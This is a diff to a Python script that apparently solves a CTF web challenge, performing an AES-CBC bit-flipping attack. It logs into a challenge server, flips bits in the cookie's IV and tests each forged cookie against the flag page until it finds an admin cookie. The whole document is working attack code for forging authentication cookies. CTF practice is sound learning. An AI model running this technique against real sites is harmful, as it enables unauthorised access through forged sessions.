@@ -1,3 +1,5 @@
+#!/bin/env python3
+
 # https://github.com/JeffersonDing/CTF/blob/master/pico_CTF_2021/web/more_cookies/ape.py
 # https://dr3dd.gitlab.io/cryptography/2019/01/10/simple-AES-CBC-bit-flipping-attack/
 
@@ -7,23 +9,20 @@ import re
 from base64 import b64decode
 from base64 import b64encode
 
-initCookieBase64 = "Q01pZXV4VW5JVlJhbmRvbbBNVUWTyb3i9ih6TPY9OvoHfMDks0jYZxXjVhA1JFKOw0qUn7dEU7gUE+1sGHAZwAHxxAm7InQXMEbchbSKHOg="
+url = 'http://flip1.geographer.fr/'
+
+s = requests.Session()
+response = s.post(url + 'login', data={'user': 'abc', 'password': 'def'})
+initCookieBase64 = s.cookies['cookie']
+
 initCookie = b64decode(initCookieBase64)
 iv = initCookie[:16]
 enc = initCookie[-64:]
 ivSize = 16
 
-print(iv)
+print('inital iv: ', iv.decode())
+print('initial cookie: {}'.format(initCookieBase64))
 
-s = requests.Session()
-url = "http://flip1.geographer.fr/flag"
-print("Starting enumeration on {}".format(url))
-
-# todo: get init cookie from http://flip1.geographer.fr/login
-# response = s.get(url, cookies={'cookie': initCookieBase64}, stream=True)
-# cookie = s.cookies['auth_name']
-
-print("initial cookie: {}".format(initCookieBase64))
 found = False
 correctCookie = ''
 flag = ''
@@ -33,7 +32,6 @@ def bitFlip(byte, bit):
 
     newIv = bytearray(iv)
     newIv[byte] = newIv[byte] ^ mask
-
     return bytes(newIv)
 
 
@@ -49,7 +47,7 @@ def testCookie(i):
         newcookie = b64encode(newIv + enc).decode()
 
         cookies_dict = {'cookie': newcookie}
-        response = requests.get(url, cookies=cookies_dict)
+        response = requests.get(url + 'flag', cookies=cookies_dict)
         html = response.content.decode()
 
         match = re.search(r'BFS\{.+\}', html)
@@ -76,5 +74,5 @@ for thread in threads:
     except:
         continue
 
-print("Correct cookie: " + correctCookie)
-print("Flag: " + flag)
+print('Admin cookie: ' + correctCookie)
+print('Flag: ' + flag)
